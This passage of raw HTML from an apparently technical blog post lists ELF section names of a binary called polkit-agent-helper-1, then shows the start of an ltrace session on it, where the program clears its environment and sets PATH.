+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>note</span><span class=o>.</span><span class=n>gnu</span><span class=o>.</span><span class=n>build</span><span class=o>-</span><span class=n>id</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>note</span><span class=o>.</span><span class=n>ABI</span><span class=o>-</span><span class=n>tag</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>gnu</span><span class=o>.</span><span class=n>hash</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>dynsym</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>dynstr</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>gnu</span><span class=o>.</span><span class=n>version</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>gnu</span><span class=o>.</span><span class=n>version_r</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>rela</span><span class=o>.</span><span class=n>dyn</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>rela</span><span class=o>.</span><span class=n>plt</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>init</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>sec</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>fini</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>rodata</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>eh_frame_hdr</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>eh_frame</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>init_array</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>fini_array</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>data</span><span class=o>.</span><span class=n>rel</span><span class=o>.</span><span class=n>ro</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>dynamic</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>got</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>data</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>bss</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>gnu</span><span class=o>.</span><span class=n>build</span><span class=o>.</span><span class=n>attributes</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>gnu_debuglink</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>gnu_debugdata</span>
+</span></span></code></pre></div><h3 id=ltrace>ltrace</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>datadiego@~ chmod +x polkit-agent-helper-1 
 </span></span><span class=line><span class=cl>datadiego@~ ltrace ./polkit-agent-helper-1 
 </span></span><span class=line><span class=cl>clearenv<span class=o>(</span>1, 0x7fffb8736d98, 0x7fffb8736da8, 0<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
 </span></span><span class=line><span class=cl>setenv<span class=o>(</span><span class=s2>&#34;PATH&#34;</span>, <span class=s2>&#34;/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>, 1<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
